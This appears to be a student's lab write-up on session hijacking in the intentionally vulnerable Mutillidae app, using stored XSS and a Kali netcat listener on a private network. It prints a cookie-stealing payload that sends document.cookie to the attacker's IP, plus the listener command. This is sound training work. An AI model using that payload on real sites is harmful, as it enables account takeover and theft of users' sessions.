# Lab: Swiping a Token with XSS 

## Objective
The objective of this lab is to use Cross-Site Scripting to capture a user’s login token and send it to the attacker using Kali Linux. 

## Steps taken
- Cleared cookies on Edge (target machine) and all Firefox cookies on Kali (attack machine)
- Set up Mutillidae on Kali (ensuring it's not logged in, setting security level to 0, and resetting the database)
- Created a new account on Kali with the username 'hacker' and logged in 
- Created a new account on Edge with the username 'kieran' and logged in
- Ran the first script to test: <script>alert(document.cookie);</script>
- Set up netcat to listen on Kali
- Ran an XSS script to capture the user's cookie from Edge to Kali's netcat listener
- Made a note of the cookie information captured on Kali for the other user on Edge
- Edited the session cookie on Firefox on Kali with the details captured to steal the session
- Refreshed the page on Firefox and got logged into kieran's account

## Screenshots and observations
*Creating the Mutillidae accounts on Kali and Edge*
<img width="1912" height="1023" alt="2 6 3 - Swiping a Token with XSS 1 - created accounts on kali and edge" src="https://github.com/user-attachments/assets/507aeb29-9e20-404a-9b15-d784d71e672b" />

*Running the first test script*

*<script>alert(document.cookie);</script>*
<img width="1923" height="1025" alt="2 6 3 - Swiping a Token with XSS 2 - running a script" src="https://github.com/user-attachments/assets/a9c5efd9-eb2c-4e6b-afb7-3b861b9a1069" />

*Set up netcat on Kali: netcat -l -v -p 80*
<img width="953" height="1024" alt="2 6 3 - Swiping a Token with XSS 3 - set up netcat to listen on kali" src="https://github.com/user-attachments/assets/7cca2758-6be6-42f9-9485-490d59e1302a" />

*Running the XSS script on Edge and capturing the cookie on Kali's netcat listener*

*<script>location.href='http://192.168.0.16/hijacker.php?cookie='+document.cookie;</script>*
<img width="1907" height="1023" alt="2 6 3 - Swiping a Token with XSS 4 - running XSS code to capture the cookie" src="https://github.com/user-attachments/assets/bc49ff53-3c90-4eb9-bccc-fc1cb7372f12" />

*Editing the session cookie on Firefox on Kali, to log into kieran's account*
<img width="1907" height="1020" alt="2 6 3 - Swiping a Token with XSS 5 - editing and logging in with kierans session cookie" src="https://github.com/user-attachments/assets/1417019c-2db0-469f-a378-74b9de522aa1" />

## Key takeaways
This lab taught me that there easy are ways of getting into other people's accounts without even knowing they're passwords, such as XSS and phishing links to hijack a session.

## Relevance
Browsers use session cookies all the time to make it easier for people to stay logged into an account, as there is tust established. XSS makes it easy to hijack a session and use the accounts.
